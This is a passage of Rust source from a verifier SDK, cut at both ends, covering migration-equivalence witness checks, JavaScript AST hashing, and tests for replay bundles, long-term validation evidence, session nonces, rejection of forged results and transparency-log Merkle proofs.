    assertions.push(AssertionResult {
        assertion: "migration_effect_receipt_refs_present".to_string(),
        passed: ids_nonempty,
        detail: if ids_nonempty {
            format!("{} effect receipt refs", referenced_ids.len())
        } else {
            "lockstep witness must reference at least one effect receipt event".to_string()
        },
    });

    let effect_events: BTreeSet<&str> = replay_bundle
        .timeline
        .iter()
        .filter(|event| event.event_type == bundle::EFFECT_RECEIPT_EVENT_TYPE)
        .map(|event| event.event_id.as_str())
        .collect();
    let refs_resolve = ids_nonempty
        && referenced_ids
            .iter()
            .all(|event_id| effect_events.contains(event_id.as_str()));
    assertions.push(AssertionResult {
        assertion: "migration_effect_receipt_refs_resolve".to_string(),
        passed: refs_resolve,
        detail: if refs_resolve {
            "all lockstep witness effect receipt refs resolve in bundle timeline".to_string()
        } else {
            "one or more lockstep witness effect receipt refs were absent from bundle timeline"
                .to_string()
        },
    });
}

fn verify_migration_lockstep_witness(
    capsule: &MigrationEquivalenceCapsule,
    assertions: &mut Vec<AssertionResult>,
) {
    let witness = &capsule.lockstep_witness;
    let metadata_ok = !witness.lockstep_oracle_id.trim().is_empty()
        && is_canonical_sha256_hex(&witness.fixture_corpus_digest)
        && !witness.proptest_seed.trim().is_empty();
    assertions.push(AssertionResult {
        assertion: "migration_lockstep_witness_metadata".to_string(),
        passed: metadata_ok,
        detail: if metadata_ok {
            format!("oracle_id={}", witness.lockstep_oracle_id)
        } else {
            "lockstep witness must name an oracle, corpus digest, and proptest seed".to_string()
        },
    });

    let counts_ok = witness.fixture_cases > 0
        && witness.proptest_cases > 0
        && witness.effect_receipt_equivalence_cases > 0;
    assertions.push(AssertionResult {
        assertion: "migration_lockstep_witness_counts_nonzero".to_string(),
        passed: counts_ok,
        detail: if counts_ok {
            format!(
                "fixture={}, proptest={}, effect_receipt={}",
                witness.fixture_cases,
                witness.proptest_cases,
                witness.effect_receipt_equivalence_cases
            )
        } else {
            "fixture, proptest, and effect-receipt case counts must all be nonzero".to_string()
        },
    });

    let zero_divergence = witness.verdict == "pass" && witness.divergence_count == 0;
    assertions.push(AssertionResult {
        assertion: "migration_lockstep_zero_divergence".to_string(),
        passed: zero_divergence,
        detail: if zero_divergence {
            "lockstep witness is a zero-divergence pass".to_string()
        } else {
            "lockstep witness must be verdict=pass with divergence_count=0".to_string()
        },
    });
}

fn compute_migration_source_hash(source_text: &str) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, MIGRATION_SOURCE_HASH_DOMAIN);
    push_length_prefixed(&mut payload, source_text.as_bytes());
    hex::encode(Sha256::digest(&payload))
}

fn compute_js_ast_hash(source_text: &str) -> Result<String, String> {
    let mut parser = JsParser::new();
    let language: Language = tree_sitter_javascript::LANGUAGE.into();
    parser
        .set_language(&language)
        .map_err(|error| format!("JavaScript parser unavailable: {error}"))?;
    let tree = parser
        .parse(source_text, None)
        .ok_or_else(|| "JavaScript parser produced no syntax tree".to_string())?;
    let root = tree.root_node();
    if root.has_error() {
        return Err("JavaScript parser rejected migration source".to_string());
    }

    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, MIGRATION_AST_HASH_DOMAIN);
    push_js_ast_node(&mut payload, root);
    Ok(hex::encode(Sha256::digest(&payload)))
}

fn push_js_ast_node(payload: &mut Vec<u8>, node: Node<'_>) {
    push_length_prefixed(payload, node.kind().as_bytes());
    payload.push(u8::from(node.is_named()));
    payload.extend_from_slice(
        &u64::try_from(node.start_byte())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.end_byte())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.child_count())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.named_child_count())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    for index in 0..node.child_count() {
        let Ok(child_index) = u32::try_from(index) else {
            continue;
        };
        if let Some(child) = node.child(child_index) {
            push_js_ast_node(payload, child);
        }
    }
}

fn compute_migration_lockstep_verdict_hash(
    capsule: &MigrationEquivalenceCapsule,
    source_hash: &str,
    target_hash: &str,
    source_ast_hash: &str,
    target_ast_hash: &str,
) -> String {
    let witness = &capsule.lockstep_witness;
    let canonical = serde_json::json!({
        "schema_version": &capsule.schema_version,
        "rule_id": &capsule.rule_id,
        "source_hash": source_hash,
        "target_hash": target_hash,
        "source_ast_hash": source_ast_hash,
        "target_ast_hash": target_ast_hash,
        "precondition_passed": capsule.precondition.passed,
        "lockstep_oracle_id": &witness.lockstep_oracle_id,
        "fixture_corpus_digest": &witness.fixture_corpus_digest,
        "proptest_seed": &witness.proptest_seed,
        "fixture_cases": witness.fixture_cases,
        "proptest_cases": witness.proptest_cases,
        "effect_receipt_equivalence_cases": witness.effect_receipt_equivalence_cases,
        "effect_receipt_ids": &witness.effect_receipt_ids,
        "divergence_count": witness.divergence_count,
        "verdict": &witness.verdict,
    });
    let canonical_bytes = serde_json::to_vec(&canonical)
        .unwrap_or_else(|error| format!("__serde:{error}").into_bytes());
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, MIGRATION_LOCKSTEP_VERDICT_HASH_DOMAIN);
    push_length_prefixed(&mut payload, &canonical_bytes);
    hex::encode(Sha256::digest(&payload))
}

fn migration_equivalence_binding_hash(
    bundle_integrity_hash: &str,
    lockstep_verdict_hash: &str,
    source_ast_hash: &str,
    target_ast_hash: &str,
) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, MIGRATION_EQUIVALENCE_BINDING_HASH_DOMAIN);
    push_length_prefixed(&mut payload, bundle_integrity_hash.as_bytes());
    push_length_prefixed(&mut payload, lockstep_verdict_hash.as_bytes());
    push_length_prefixed(&mut payload, source_ast_hash.as_bytes());
    push_length_prefixed(&mut payload, target_ast_hash.as_bytes());
    hex::encode(Sha256::digest(&payload))
}

fn is_canonical_sha256_hex(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|byte| matches!(byte, b'0'..=b'9' | b'a'..=b'f'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::collections::BTreeMap;

    fn make_replay_bundle_bytes(verifier_identity: &str) -> Vec<u8> {
        let artifact_bytes = b"replay-bundle-artifact";
        let artifact_path = "artifacts/replay.json".to_string();
        let mut artifacts = BTreeMap::new();
        artifacts.insert(
            artifact_path.clone(),
            bundle::BundleArtifact {
                media_type: "application/json".to_string(),
                digest: bundle::hash(artifact_bytes),
                bytes_hex: hex::encode(artifact_bytes),
            },
        );
        let mut replay_bundle = bundle::ReplayBundle {
            header: bundle::BundleHeader {
                hash_algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                payload_length_bytes: u64::try_from(artifact_bytes.len())
                    .expect("artifact length should fit in u64"),
                chunk_count: 1,
            },
            schema_version: bundle::REPLAY_BUNDLE_SCHEMA_VERSION.to_string(),
            sdk_version: SDK_VERSION.to_string(),
            bundle_id: "bundle-alpha".to_string(),
            incident_id: "incident-alpha".to_string(),
            created_at: "2026-02-21T00:00:00Z".to_string(),
            policy_version: "policy.v1".to_string(),
            verifier_identity: verifier_identity.to_string(),
            timeline: vec![bundle::TimelineEvent {
                sequence_number: 1,
                event_id: "evt-1".to_string(),
                timestamp: "2026-02-21T00:00:01Z".to_string(),
                event_type: "verification.started".to_string(),
                payload: json!({"phase": "replay"}),
                state_snapshot: json!({"step": 1}),
                causal_parent: None,
                policy_version: "policy.v1".to_string(),
            }],
            initial_state_snapshot: json!({"baseline": true}),
            evidence_refs: vec!["evidence://capsule/alpha".to_string()],
            artifacts,
            chunks: vec![bundle::BundleChunk {
                chunk_index: 0,
                total_chunks: 1,
                artifact_path,
                payload_length_bytes: u64::try_from(artifact_bytes.len())
                    .expect("artifact length should fit in u64"),
                payload_digest: bundle::hash(artifact_bytes),
            }],
            metadata: BTreeMap::new(),
            integrity_hash: String::new(),
            signature: bundle::BundleSignature {
                algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                signature_hex: String::new(),
            },
        };
        bundle::seal(&mut replay_bundle).expect("test replay bundle should seal");
        bundle::serialize(&replay_bundle).expect("test replay bundle should serialize")
    }

    fn reference_migration_equivalence_capsule() -> MigrationEquivalenceCapsule {
        let source_text = "const value = require(\"dep\");\nmodule.exports = value;\n".to_string();
        let target_text = "import value from \"dep\";\nexport default value;\n".to_string();
        let mut capsule = MigrationEquivalenceCapsule {
            schema_version: MIGRATION_EQUIVALENCE_SCHEMA_VERSION.to_string(),
            rule_id: "rewrite:cjs-require-to-esm".to_string(),
            source: MigrationSourceSnapshot {
                path: "src/input.cjs".to_string(),
                source_hash: compute_migration_source_hash(&source_text),
                ast_hash: compute_js_ast_hash(&source_text)
                    .expect("reference source should parse as JavaScript"),
                source_text,
            },
            target: MigrationSourceSnapshot {
                path: "src/output.mjs".to_string(),
                source_hash: compute_migration_source_hash(&target_text),
                ast_hash: compute_js_ast_hash(&target_text)
                    .expect("reference target should parse as JavaScript"),
                source_text: target_text,
            },
            precondition: MigrationPreconditionProof {
                rule_id: "rewrite:cjs-require-to-esm".to_string(),
                source_contains: vec!["require(\"dep\")".to_string()],
                source_not_contains: vec!["import value".to_string()],
                target_contains: vec!["import value".to_string(), "export default".to_string()],
                target_not_contains: vec!["require(\"dep\")".to_string()],
                passed: true,
            },
            lockstep_witness: MigrationLockstepWitness {
                lockstep_oracle_id: "compat-lockstep-oracle-v1".to_string(),
                fixture_corpus_digest: "aa".repeat(32),
                proptest_seed: "proptest-seed:cjs-esm:0000000000000001".to_string(),
                fixture_cases: 1,
                proptest_cases: 1,
                effect_receipt_equivalence_cases: 1,
                effect_receipt_ids: vec!["evt-effect-1".to_string()],
                divergence_count: 0,
                verdict: "pass".to_string(),
                lockstep_verdict_hash: String::new(),
            },
        };
        capsule.lockstep_witness.lockstep_verdict_hash = compute_migration_lockstep_verdict_hash(
            &capsule,
            &capsule.source.source_hash,
            &capsule.target.source_hash,
            &capsule.source.ast_hash,
            &capsule.target.ast_hash,
        );
        capsule
    }

    fn make_migration_equivalence_bundle_bytes(
        verifier_identity: &str,
        capsule: &MigrationEquivalenceCapsule,
    ) -> Vec<u8> {
        let replay_artifact_bytes = b"replay-bundle-artifact";
        let replay_artifact_path = "artifacts/replay.json".to_string();
        let capsule_artifact_bytes =
            serde_json::to_vec(capsule).expect("migration equivalence capsule should serialize");
        let capsule_payload_len = u64::try_from(capsule_artifact_bytes.len())
            .expect("capsule artifact length should fit in u64");
        let replay_payload_len = u64::try_from(replay_artifact_bytes.len())
            .expect("replay artifact length should fit in u64");

        let mut artifacts = BTreeMap::new();
        artifacts.insert(
            replay_artifact_path.clone(),
            bundle::BundleArtifact {
                media_type: "application/json".to_string(),
                digest: bundle::hash(replay_artifact_bytes),
                bytes_hex: hex::encode(replay_artifact_bytes),
            },
        );
        artifacts.insert(
            MIGRATION_EQUIVALENCE_ARTIFACT_PATH.to_string(),
            bundle::BundleArtifact {
                media_type: "application/vnd.franken-node.migration-equivalence+json".to_string(),
                digest: bundle::hash(&capsule_artifact_bytes),
                bytes_hex: hex::encode(&capsule_artifact_bytes),
            },
        );

        let mut replay_bundle = bundle::ReplayBundle {
            header: bundle::BundleHeader {
                hash_algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                payload_length_bytes: replay_payload_len.saturating_add(capsule_payload_len),
                chunk_count: 2,
            },
            schema_version: bundle::REPLAY_BUNDLE_SCHEMA_VERSION.to_string(),
            sdk_version: SDK_VERSION.to_string(),
            bundle_id: "bundle-alpha".to_string(),
            incident_id: "incident-alpha".to_string(),
            created_at: "2026-02-21T00:00:00Z".to_string(),
            policy_version: "policy.v1".to_string(),
            verifier_identity: verifier_identity.to_string(),
            timeline: vec![
                bundle::TimelineEvent {
                    sequence_number: 1,
                    event_id: "evt-1".to_string(),
                    timestamp: "2026-02-21T00:00:01Z".to_string(),
                    event_type: "verification.started".to_string(),
                    payload: json!({"phase": "migration_equivalence"}),
                    state_snapshot: json!({"step": 1}),
                    causal_parent: None,
                    policy_version: "policy.v1".to_string(),
                },
                bundle::TimelineEvent {
                    sequence_number: 2,
                    event_id: "evt-effect-1".to_string(),
                    timestamp: "2026-02-21T00:00:02Z".to_string(),
                    event_type: bundle::EFFECT_RECEIPT_EVENT_TYPE.to_string(),
                    payload: json!({"effect": "module_resolve", "result": "equivalent"}),
                    state_snapshot: json!({"step": 2}),
                    causal_parent: Some(1),
                    policy_version: "policy.v1".to_string(),
                },
            ],
            initial_state_snapshot: json!({"baseline": true}),
            evidence_refs: vec!["evidence://capsule/alpha".to_string()],
            artifacts,
            chunks: vec![
                bundle::BundleChunk {
                    chunk_index: 0,
                    total_chunks: 2,
                    artifact_path: replay_artifact_path,
                    payload_length_bytes: replay_payload_len,
                    payload_digest: bundle::hash(replay_artifact_bytes),
                },
                bundle::BundleChunk {
                    chunk_index: 1,
                    total_chunks: 2,
                    artifact_path: MIGRATION_EQUIVALENCE_ARTIFACT_PATH.to_string(),
                    payload_length_bytes: capsule_payload_len,
                    payload_digest: bundle::hash(&capsule_artifact_bytes),
                },
            ],
            metadata: BTreeMap::from([(
                "artifact_kind".to_string(),
                "migration_equivalence".to_string(),
            )]),
            integrity_hash: String::new(),
            signature: bundle::BundleSignature {
                algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                signature_hex: String::new(),
            },
        };
        bundle::seal(&mut replay_bundle).expect("test migration bundle should seal");
        bundle::serialize(&replay_bundle).expect("test migration bundle should serialize")
    }

    fn reference_long_term_verification_evidence() -> LongTermVerificationEvidence {
        reference_long_term_verification_evidence_for_suite("ed25519-v1")
    }

    fn reference_long_term_verification_evidence_for_suite(
        crypto_suite: &str,
    ) -> LongTermVerificationEvidence {
        let mut artifact = LongTermArtifactEvidence {
            artifact_id: "artifact-alpha".to_string(),
            artifact_hash: bundle::hash(b"artifact-alpha-bytes"),
            crypto_suite: crypto_suite.to_string(),
            claimed_at_unix_seconds: 1_000,
            marker_hash: String::new(),
        };
        artifact.marker_hash = long_term_artifact_marker_hash(&artifact);

        let artifact_leaf_hash = long_term_marker_leaf_hash(&artifact.marker_hash);
        let second_leaf_hash = long_term_marker_leaf_hash(&bundle::hash(b"second-marker"));
        let third_leaf_hash = long_term_marker_leaf_hash(&bundle::hash(b"third-marker"));
        let origin_leaf_hashes = vec![artifact_leaf_hash.clone(), second_leaf_hash.clone()];
        let origin_root = LongTermMmrRoot {
            tree_size: 2,
            root_hash: long_term_merkle_root_from_leaf_hashes(&origin_leaf_hashes)
                .expect("origin root should compute"),
        };
        let super_leaf_hashes = vec![
            artifact_leaf_hash.clone(),
            second_leaf_hash,
            third_leaf_hash,
        ];
        let attested_root = LongTermMmrRoot {
            tree_size: 3,
            root_hash: long_term_merkle_root_from_leaf_hashes(&super_leaf_hashes)
                .expect("attested root should compute"),
        };
        let prefix_proof = LongTermMmrPrefixProof {
            prefix_size: origin_root.tree_size,
            super_tree_size: attested_root.tree_size,
            prefix_root_hash: origin_root.root_hash.clone(),
            super_root_hash: attested_root.root_hash.clone(),
            prefix_root_from_super: origin_root.root_hash.clone(),
            super_leaf_hashes,
        };
        let mut reattestation = LongTermMmrRootReattestation {
            schema_version: MMR_ROOT_REATTESTATION_SCHEMA_VERSION.to_string(),
            previous_root: origin_root.clone(),
            attested_root: attested_root.clone(),
            prefix_proof,
            issued_at_unix_seconds: 1_500,
            crypto_suite: crypto_suite.to_string(),
            attestation_hash: String::new(),
        };
        reattestation.attestation_hash = compute_long_term_reattestation_hash(&reattestation);

        let mut statement = LongTermMmrRootWitnessStatement {
            schema_version: MMR_ROOT_WITNESS_SCHEMA_VERSION.to_string(),
            root: attested_root,
            observed_at_unix_seconds: 1_700,
            witness_group_id: "witness-group-a".to_string(),
            witness_policy_id: "policy-a".to_string(),
            content_hash: String::new(),
        };
        statement.content_hash = compute_long_term_witness_content_hash(&statement);

        let signing_key_a = SigningKey::from_bytes(&[7_u8; 32]);
        let signing_key_b = SigningKey::from_bytes(&[8_u8; 32]);
        let threshold_config = LongTermThresholdConfig {
            threshold: 2,
            total_signers: 2,
            signer_keys: vec![
                LongTermSignerKey {
                    key_id: "witness-a".to_string(),
                    public_key_hex: hex::encode(VerifyingKey::from(&signing_key_a).to_bytes()),
                },
                LongTermSignerKey {
                    key_id: "witness-b".to_string(),
                    public_key_hex: hex::encode(VerifyingKey::from(&signing_key_b).to_bytes()),
                },
            ],
        };
        let mut witness_artifact = LongTermPublicationArtifact {
            artifact_id: MMR_ROOT_WITNESS_ARTIFACT_ID.to_string(),
            connector_id: MMR_ROOT_WITNESS_CONNECTOR_ID.to_string(),
            content_hash: statement.content_hash.clone(),
            signatures: Vec::new(),
        };
        witness_artifact.signatures = vec![
            sign_long_term_witness(&signing_key_a, "witness-a", &witness_artifact),
            sign_long_term_witness(&signing_key_b, "witness-b", &witness_artifact),
        ];

        LongTermVerificationEvidence {
            schema_version: LONG_TERM_VERIFICATION_SCHEMA_VERSION.to_string(),
            as_of_unix_seconds: 1_900,
            artifact,
            suite_records: vec![LongTermCryptoSuiteRecord {
                crypto_suite: crypto_suite.to_string(),
                valid_from_unix_seconds: 900,
                valid_until_unix_seconds: None,
                compromised_at_unix_seconds: Some(2_100),
            }],
            inclusion_proof: LongTermMmrInclusionProof {
                leaf_index: 0,
                tree_size: origin_root.tree_size,
                leaf_hash: artifact_leaf_hash,
                audit_path: origin_leaf_hashes[1..].to_vec(),
            },
            reattestation_chain: LongTermMmrRootReattestationChain {
                origin_root,
                attestations: vec![reattestation],
            },
            witness_receipt: LongTermMmrRootWitnessReceipt {
                statement,
                threshold_config,
                witness_artifact,
                trace_id: "trace-ltv-alpha".to_string(),
                timestamp: "2026-06-17T02:30:00Z".to_string(),
            },
        }
    }

    fn sign_long_term_witness(
        signing_key: &SigningKey,
        key_id: &str,
        artifact: &LongTermPublicationArtifact,
    ) -> LongTermPartialSignature {
        let message = long_term_threshold_signing_message(
            &artifact.artifact_id,
            &artifact.connector_id,
            &artifact.content_hash,
        );
        let signature = signing_key.sign(&message);
        LongTermPartialSignature {
            signer_id: key_id.to_string(),
            key_id: key_id.to_string(),
            signature_hex: hex::encode(signature.to_bytes()),
        }
    }

    fn verify_as_of_ltv_for_test(
        sdk: &VerifierSdk,
        evidence: &LongTermVerificationEvidence,
        context: &str,
    ) -> VerificationResult {
        let result = sdk.verify_as_of_ltv(evidence);
        assert!(result.is_ok(), "{context}: {result:?}");
        result.unwrap_or_else(|_| VerificationResult {
            operation: VerificationOperation::LongTermValidation,
            verdict: VerificationVerdict::Inconclusive,
            confidence_score: 0.0,
            checked_assertions: Vec::new(),
            execution_timestamp: String::new(),
            verifier_identity: String::new(),
            artifact_binding_hash: String::new(),
            verifier_signature: String::new(),
            sdk_version: SDK_VERSION.to_string(),
            result_origin_nonce: String::new(),
        })
    }

    #[test]
    fn test_sdk_version_constant() {
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
    }

    #[test]
    fn test_sdk_version_min_constant() {
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
    }

    #[test]
    fn session_nonce_counter_increment_handles_overflow() {
        assert_eq!(increment_session_nonce_counter(0), 1);
        assert_eq!(increment_session_nonce_counter(u64::MAX - 1), u64::MAX);
        assert_eq!(increment_session_nonce_counter(u64::MAX), u64::MAX);
    }

    #[test]
    fn session_nonce_counter_exhaustion_regression_test() {
        let counter = AtomicU64::new(u64::MAX);

        // Next call should fail with NonceCounterExhausted error
        let result = next_session_nonce_counter_from(&counter);
        assert!(matches!(
            result,
            Err(VerifierSdkError::NonceCounterExhausted)
        ));
        assert_eq!(counter.load(Ordering::Relaxed), u64::MAX);
    }

    #[test]
    fn default_nonce_fallback_uses_random_hex_when_counter_is_exhausted() {
        let counter = AtomicU64::new(u64::MAX);
        let first = default_result_origin_nonce_from_counter(&counter);
        let second = default_result_origin_nonce_from_counter(&counter);

        for nonce in [&first, &second] {
            assert_eq!(nonce.len(), 64);
            assert!(
                nonce
                    .bytes()
                    .all(|byte| matches!(byte, b'0'..=b'9' | b'a'..=b'f'))
            );
            assert_ne!(nonce, "nonce-exhausted-placeholder");
        }
        assert_ne!(first, second);
        assert_eq!(counter.load(Ordering::Relaxed), u64::MAX);
    }

    #[test]
    fn session_step_accepts_signed_result_from_same_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");

        let step = sdk
            .record_session_step(&mut session, &result)
            .expect("same verifier result should record");

        assert_eq!(step.step_index, 0);
        assert_eq!(step.verdict, VerificationVerdict::Pass);
        assert_eq!(session.steps().len(), 1);
        assert_eq!(
            session.steps()[0].artifact_binding_hash,
            "artifact-hash-alpha"
        );
        assert!(!session.steps()[0].step_signature.is_empty());
    }

    #[test]
    fn session_step_rejects_result_from_different_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let other_sdk = create_verifier_sdk("verifier://beta");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let foreign_result = other_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "foreign verifier".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("foreign verifier result should be built");

        let err = sdk
            .record_session_step(&mut session, &foreign_result)
            .expect_err("foreign verifier result must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn record_session_step_rejects_forged_same_verifier_result() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let mut forged_result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        forged_result.verdict = VerificationVerdict::Fail;
        forged_result.checked_assertions[0].detail = "forged locally".to_string();
        forged_result.result_origin_nonce.clear();
        forged_result.verifier_signature =
            facade_result_signature(&sdk.signing_key, &forged_result)
                .expect("forged signature should compute");

        let err = sdk
            .record_session_step(&mut session, &forged_result)
            .expect_err("forged same-verifier result must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn record_session_step_rejects_same_verifier_result_from_different_sdk_instance() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let sibling_sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let sibling_result = sibling_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier sibling instance".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier sibling result should be built");

        let err = sdk
            .record_session_step(&mut session, &sibling_result)
            .expect_err("same-verifier result from a different sdk instance must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn record_session_step_rejects_when_step_cap_is_reached() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        session.steps = (0..MAX_VERIFICATION_SESSION_STEPS)
            .map(|step_index| SessionStep {
                step_index,
                operation: VerificationOperation::Claim,
                verdict: VerificationVerdict::Pass,
                artifact_binding_hash: format!("artifact-hash-{step_index}"),
                timestamp: current_utc_timestamp(),
                step_signature: format!("step-signature-{step_index}"),
            })
            .collect();

        let err = sdk
            .record_session_step(&mut session, &result)
            .expect_err("full session step log must fail closed");

        assert!(matches!(
            err,
            VerifierSdkError::BoundedStateExceeded {
                surface: "verification_session_steps",
                max: MAX_VERIFICATION_SESSION_STEPS
            }
        ));
        assert_eq!(session.steps().len(), MAX_VERIFICATION_SESSION_STEPS);
    }

    #[test]
    fn transparency_log_accepts_signed_result_from_same_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let mut log = Vec::new();

        let entry = sdk
            .append_transparency_log(&mut log, &result)
            .expect("same verifier result should append");

        assert_eq!(entry.verifier_id, "verifier://alpha");
        assert_eq!(entry.merkle_proof[0], format!("root:{}", entry.result_hash));
        assert_eq!(entry.merkle_proof[1], "leaf_index:0");
        assert_eq!(entry.merkle_proof[2], "tree_size:1");
        assert_eq!(log.len(), 1);
        assert_eq!(log[0], entry);
    }

    #[test]
    fn transparency_log_rejects_when_entry_cap_is_reached() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let mut log: Vec<TransparencyLogEntry> = (0..MAX_TRANSPARENCY_LOG_ENTRIES)
            .map(|index| TransparencyLogEntry {
                result_hash: bundle::hash(format!("result-{index}").as_bytes()),
                timestamp: current_utc_timestamp(),
                verifier_id: "verifier://alpha".to_string(),
                merkle_proof: Vec::new(),
            })
            .collect();

        let err = sdk
            .append_transparency_log(&mut log, &result)
            .expect_err("full transparency log must fail closed");

        assert!(matches!(
            err,
            VerifierSdkError::BoundedStateExceeded {
                surface: "transparency_log",
                max: MAX_TRANSPARENCY_LOG_ENTRIES
            }
        ));
        assert_eq!(log.len(), MAX_TRANSPARENCY_LOG_ENTRIES);
    }

    #[test]
    fn transparency_log_rejects_malformed_existing_result_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let mut log = vec![TransparencyLogEntry {
            result_hash: "not-a-canonical-digest".to_string(),
            timestamp: current_utc_timestamp(),
            verifier_id: "verifier://alpha".to_string(),
            merkle_proof: vec![
                format!("root:{}", bundle::hash(b"valid-root")),
                "leaf_index:0".to_string(),
                "tree_size:1".to_string(),
            ],
        }];

        let err = sdk
            .append_transparency_log(&mut log, &result)
            .expect_err("malformed existing transparency entry must fail closed");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidTransparencyLogEntry { index: 0, .. }
        ));
        assert_eq!(log.len(), 1);
        assert_eq!(log[0].result_hash, "not-a-canonical-digest");
    }

    #[test]
    fn transparency_log_emits_verifiable_merkle_audit_path() {
        fn proof_root(proof: &[String]) -> &str {
            proof[0]
                .strip_prefix("root:")
                .expect("proof must begin with encoded root")
        }

        fn verify_merkle_proof(leaf_hash: &str, proof: &[String]) -> String {
            let leaf_index = proof[1]
                .strip_prefix("leaf_index:")
                .expect("proof must encode leaf index")
                .parse::<usize>()
                .expect("leaf index should parse");
            let tree_size = proof[2]
                .strip_prefix("tree_size:")
                .expect("proof must encode tree size")
                .parse::<usize>()
                .expect("tree size should parse");

            assert!(leaf_index < tree_size);

            let mut computed = leaf_hash.to_string();
            for step in &proof[3..] {
                if let Some(left) = step.strip_prefix("left:") {
                    computed = transparency_merkle_parent_hash(left, &computed);
                } else if let Some(right) = step.strip_prefix("right:") {
                    computed = transparency_merkle_parent_hash(&computed, right);
                } else {
                    panic!("unexpected proof step: {step}");
                }
            }
            computed
        }

        let sdk = create_verifier_sdk("verifier://alpha");
        let first = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "first".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("first result should build");
        let second = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "second".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("second result should build");

        let mut log = Vec::new();
        let first_entry = sdk
            .append_transparency_log(&mut log, &first)
            .expect("first result should append");
        let second_entry = sdk
            .append_transparency_log(&mut log, &second)
            .expect("second result should append");

        assert_eq!(
            verify_merkle_proof(&first_entry.result_hash, &first_entry.merkle_proof),
            proof_root(&first_entry.merkle_proof)
        );
        assert_eq!(
            verify_merkle_proof(&second_entry.result_hash, &second_entry.merkle_proof),
            proof_root(&second_entry.merkle_proof)
        );
